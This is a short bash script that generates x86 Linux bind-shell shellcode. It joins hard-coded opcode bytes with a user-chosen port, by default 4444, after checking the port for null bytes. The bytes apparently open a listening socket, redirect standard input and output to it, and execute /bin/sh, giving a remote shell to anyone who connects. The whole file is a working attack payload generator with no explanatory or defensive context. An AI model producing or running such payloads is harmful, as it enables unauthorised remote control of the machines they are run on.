part_1="\x31\xdb\xf7\xe3\x50\xb0\x66\xb3\x01\x53\x6a\x02\x89\xe1\xcd\x80\x52\x89\xc2\xfe\xc3\x66\x68"
part_2="\x66\x53\x89\xe6\x6a\x10\x56\x52\x89\xe1\xb0\x66\xcd\x80\x6a\x01\x52\x89\xe1\xb3\x04\xb0\x66\xcd\x80\x6a\x10\x54\x56\x52\x89\xe1\xb0\x66\xb3\x05\xcd\x80\x89\xc3\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x8d\x0c\x24\xb0\x0b\xcd\x80"

if [[ ! $# == 1 ]]; then
        port="\x5c\x11"
elif [[ $1 -gt 1 ]] && [[ $1 -lt 256 ]]; then
        echo "Port values between 1 and 255 are unsupported, encoding is required"
        exit 1
elif [[ $1 -gt 255 ]] && [[ $1 -lt 65536 ]]; then
        v=`echo "obase=16; $1" | bc`
        if [[ 0x${v:2:2} -eq 0x0 ]]; then
                echo "Port contains nulls, requires encoding"
                exit 1
        fi
        port=`echo "\x${v:0:2}\x${v:2:2}" | tr '[:upper:]' '[:lower:]'`
else
        echo "Invalid port specified."
        exit 1
fi

echo $part_1$port$part_2
